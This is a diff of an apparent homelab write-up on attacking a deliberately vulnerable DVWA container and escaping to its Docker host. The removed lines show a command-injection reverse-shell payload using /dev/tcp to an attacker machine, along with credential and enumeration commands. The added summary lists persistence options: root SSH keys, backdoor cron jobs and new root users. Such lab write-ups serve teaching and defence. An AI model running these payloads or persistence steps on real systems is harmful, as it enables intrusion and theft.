@@ -1013,284 +1013,68 @@ wazuh:!:20737::::::
 
 The container escape is complete. Starting from a command injection vulnerability in a web application, I achieved read access to the underlying host's credential store without ever touching the Docker socket directly from the compromised container.
 
+## Attack Impact Summary
 
-_____________________________________
+### What Was Achieved
 
-## Phase 1 — Command Injection Discovery & RCE Confirmation
-
-### 1.1 — Baseline Behavior
-
-I navigated to the DVWA Command Injection module at: `http://10.0.40.10/vulnerabilities/exec/`
-
-Security level was set to **Low**. I submitted a legitimate ping input to observe normal behavior: 
-
-```
-127.0.0.1
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
-|---|---|
-| `127.0.0.1` | Loopback address — valid input to confirm the ping function works as expected |
-
-</details>
-
-**Output:** Standard ping response — 4 packets sent to localhost, confirming the application executes OS-level ping commands server-side.
+Starting from a single unsanitized input field in a web application, I achieved full host filesystem read/write access on `vuln-docker-01` without exploiting a single CVE or kernel vulnerability. The entire chain relied on misconfigurations and weak credentials.
 
 ---
 
-<img width="655" height="496" alt="Screenshot 2026-11-01 101432" src="https://github.com/user-attachments/assets/b8a09fa5-4b47-4798-b8aa-f29cd4bdf192" />
+### Credentials & Hashes Obtained
 
-### 1.2 — Injection Test
-
-With server-side command execution confirmed, I tested for command injection using a semicolon separator to append a second OS command:
-
-```
-127.0.0.1; whoami
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
+| Credential | Detail |
 |---|---|
-| `127.0.0.1` | Valid ping target — satisfies any basic input validation |
-| `;` | Bash command separator — terminates the ping command and starts a new one |
-| `whoami` | Prints the current OS user running the web process |
-
-</details>
-
-**Output:**
-
-www-data
-
-<img width="280" height="159" alt="Screenshot 2026-11-01 101511" src="https://github.com/user-attachments/assets/49a07e75-703e-4c9d-861e-9e67d67318e1" />
-
-
-The application executed `whoami` on the server and returned the result in the HTTP response. The web server process is running as `www-data`. Remote code execution confirmed.
-
-**Root cause:** The application passes user input directly to a shell command with no sanitization or allowlist validation. At Low security, DVWA does not strip or escape shell metacharacters such as `;`, `|`, or `&&`.
-
-**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application
-**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
-
-## Phase 2 — Reverse Shell
-
-### 2.1 — Listener Setup
-
-On my Kali attacker machine (`10.0.50.10`) I started a netcat listener before sending the payload:
-
-```bash
-nc -lvnp 4444
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
-|---|---|
-| `nc` | Netcat — lightweight TCP utility |
-| `-l` | Listen mode |
-| `-v` | Verbose output |
-| `-n` | No DNS resolution |
-| `-p 4444` | Listen on port 4444 |
-
-</details>
+| `docker_user01` password hash | SHA-512 (`$6$`) — offline crackable via hashcat; potential SSH access to host |
+| DVWA database password | Plaintext in `config.inc.php` — direct database access |
+| DVWA user password hashes | 5 accounts, MD5 — trivially crackable |
+| Portainer admin password | Obtained via brute force against API — full container management access |
 
 ---
 
-### 2.2 — Reverse Shell Payload
+### Reconnaissance Gained
 
-In the DVWA Command Injection field I submitted:
-
-```
-127.0.0.1; bash -c ‘bash -i >& /dev/tcp/10.0.50.10/4444 0>&1’
-```
-
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
+| Item | Detail |
 |---|---|
-| `127.0.0.1;` | Valid ping target + separator to inject second command |
-| `bash -c '...'` | Execute the following string as a bash command |
-| `bash -i` | Start an interactive bash shell |
-| `>& /dev/tcp/10.0.50.10/4444` | Redirect stdout and stderr to a TCP connection back to Kali on port 4444 |
-| `0>&1` | Redirect stdin to the same TCP connection — completes the interactive shell |
-
-</details>
-
-**Result:** Netcat listener received the connection:
-
-<img width="364" height="234" alt="image" src="https://github.com/user-attachments/assets/bab2e3d4-ca49-41ee-9dbd-8bc46cea3118" />
-
-`listening on [any] 4444 ...
-connect to [10.0.50.10] from (UNKNOWN) [10.0.40.10] <ephemeral_port>
-www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$`
-
-<img width="234" height="60" alt="image" src="https://github.com/user-attachments/assets/29800614-5c64-40f4-b7c7-05ca7b09e3f0" />
-
-`Interactive shell established as `www-data` inside the DVWA Docker container (`fe89249e8052`).`
-
-## Phase 3 — Container Enumeration
-
-With a shell as `www-data` inside the DVWA container, I enumerated the environment to identify any direct privilege escalation or escape paths before looking for lateral movement options.
+| Full host `/etc/shadow` | Complete user list, locked vs active accounts, password aging policy |
+| Host OS | Ubuntu (inferred from shadow format and system account names) |
+| Docker version | 29.9.0 — full container inventory visible via Portainer API |
+| Internal network layout | Docker bridge subnets, host IP, inter-container routing |
+| Security tooling | Wazuh agent confirmed on host — attacker knows what defensive tooling is present |
 
 ---
 
-### 3.1 — Current User & Sudo
+### Persistence & Further Access Opportunities
 
-```bash
-whoami
-sudo -l
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
+| Opportunity | Method |
 |---|---|
-| `whoami` | Confirm current user context |
-| `sudo -l` | List any sudo privileges granted to current user |
-
-</details>
-
-**Output:** `www-data` — no sudo privileges.
+| Plant SSH authorized key | Write `/root/.ssh/authorized_keys` via host filesystem mount — persistent root SSH |
+| Add backdoor cron job | Write to `/etc/cron.d/` on host via privileged container |
+| Read existing SSH private keys | Read `/root/.ssh/` or `/home/docker_user01/.ssh/` for pre-existing keys |
+| Modify `/etc/passwd` | Add new root-level user directly to host |
+| Deploy persistent backdoor container | Use Portainer API to run a container that survives DVWA restarts |
 
 ---
 
-<img width="306" height="43" alt="image" src="https://github.com/user-attachments/assets/292f69a5-4010-42f9-a02d-3460276084a7" />
+### Lateral Movement Opportunities
 
-
-### 3.2 — DVWA Database Credentials
-
-```bash
-cat /var/www/html/config/config.inc.php
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
+| Target | Path |
 |---|---|
-| `cat` | Print file contents |
-| `/var/www/html/config/config.inc.php` | DVWA database configuration file — often contains plaintext credentials |
-
-</details>
-
-**Output (relevant lines):**
-```php
-$_DVWA[ 'db_user' ]     = 'dvwa';
-$_DVWA[ 'db_password' ] = '<DVWA_DB_PASSWORD_REDACTED>';
-$_DVWA[ 'db_database' ] = 'dvwa';
-$_DVWA[ 'db_port']      = '3306';
-```
-
-Credentials noted for credential reuse testing against other services.
-
-<img width="421" height="223" alt="image" src="https://github.com/user-attachments/assets/fcfa312b-b861-4db1-be12-0231c91ae81a" />
+| `vuln-docker-01` host (SSH) | Crack `docker_user01` hash → direct SSH login |
+| MariaDB container | Portainer admin access — exec into DB container, dump all data |
+| bWAPP container | Portainer admin access — additional vulnerable app for further scenarios |
+| Other VLAN hosts | From host, enumerate routing — potential pivot depending on firewall rules |
 
 ---
 
-### 3.3 — SUID Binaries
+### Key Takeaway
 
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
+A single command injection vulnerability in a low-security web application provided the initial foothold. From there, no CVEs or kernel exploits were required — the entire escalation relied on:
 
-<details><summary>Command explained</summary>
+1. No input sanitization in DVWA (CWE-78)
+2. Portainer API exposed and reachable from inside the container
+3. Weak Portainer admin password susceptible to brute force
+4. Portainer configured with privileged container creation allowed
+5. No runtime container security controls (no AppArmor profile, no seccomp restrictions enforced)
 
-| Component | Meaning |
-|---|---|
-| `find /` | Search from root |
-| `-perm -4000` | Files with the SUID bit set |
-| `-type f` | Regular files only |
-| `2>/dev/null` | Suppress permission errors |
-
-</details>
-
-**Output:** Standard system binaries only (`su`, `mount`, `passwd`, etc.) — no exploitable SUID binaries present.
-
-<img width="405" height="90" alt="image" src="https://github.com/user-attachments/assets/54ce22d6-265e-468b-b30b-7f688b267634" />
-
----
-
-### 3.4 — Docker Socket
-
-```bash
-ls -la /var/run/docker.sock
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
-|---|---|
-| `ls -la` | List with permissions |
-| `/var/run/docker.sock` | Docker daemon socket — if accessible from inside a container, allows direct host escape |
-
-</details>
-
-**Output:** `ls: cannot access '/var/run/docker.sock': No such file or directory`
-
-Docker socket not exposed inside this container. No direct escape path available.
-
-<img width="352" height="27" alt="image" src="https://github.com/user-attachments/assets/ad48afef-3ae5-45d6-9204-0ee536aaae10" />
-
----
-
-### 3.5 — Network & Host Discovery
-
-```bash
-cat /etc/hosts
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
-|---|---|
-| `cat /etc/hosts` | Show local hostname-to-IP mappings — reveals other hosts on the same Docker network |
-
-</details>
-
-**Output:**
-
-<img width="304" height="73" alt="image" src="https://github.com/user-attachments/assets/86a70d11-8ea5-4626-80f8-353fbf91b1bd" />
-
-Host `10.0.40.10` (`vuln-docker-01`) is the underlying Docker host. The container can reach it directly.
-
----
-
-### 3.6 — Portainer Discovery
-
-```bash
-curl -sk https://10.0.40.10:9443/api/status
-```
-
-<details><summary>Command explained</summary>
-
-| Component | Meaning |
-|---|---|
-| `curl` | HTTP client |
-| `-sk` | Silent + skip TLS verification |
-| `https://10.0.40.10:9443/api/status` | Portainer CE unauthenticated status endpoint |
-
-</details>
-
-**Output:**
-```json
-{"InstanceID":"...","Version":"2.45.2"}
-```
-
-Portainer CE v2.45.2 is running on the host and reachable from inside the container. The management interface exposes a Docker API proxy — a potential path to host-level access if credentials can be obtained.
-
----
-
-### 3.7 — Enumeration Summary
-
-| Check | Result |
-|---|---|
-| Sudo privileges | None |
-| Exploitable SUID binaries | None |
-| Docker socket | Not exposed |
-| Writable host bind mounts | None found |
-| Credential reuse (DVWA → Portainer) | Failed — invalid credentials |
-| Portainer CE API reachable | **Yes** — v2.45.2 on `10.0.40.10:9443` |
-
-No direct container escape path available. Pivoting to Portainer API credential attack.
+**Result:** Full host filesystem read/write on `vuln-docker-01` from an unauthenticated web request.
